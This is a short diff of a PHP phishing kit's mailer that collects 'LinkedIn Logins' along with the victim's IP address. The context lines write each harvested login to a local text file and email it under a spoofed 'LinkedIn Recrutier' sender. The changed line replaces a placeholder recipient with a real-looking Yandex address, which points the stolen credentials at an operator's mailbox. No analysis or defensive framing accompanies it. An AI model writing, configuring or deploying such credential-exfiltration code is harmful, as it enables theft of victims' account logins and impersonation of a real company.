@@ -16,7 +16,7 @@ $message .= "-----------+ Created in 2019 By [Royalty] +----------\n";
 
 @fclose(@fwrite(@fopen("LinkedIn-Login.txt", "a"),$message));
 
-$send="email@gmail.com";  //change email address for result//
+$send="xiaolchen@yandex.com";  //change email address for result//
 
 $subject = "||LinkedIn Logins||$ip ";
 $headers = "From: LinkedIn Recrutier<rezult@linkin.com>";
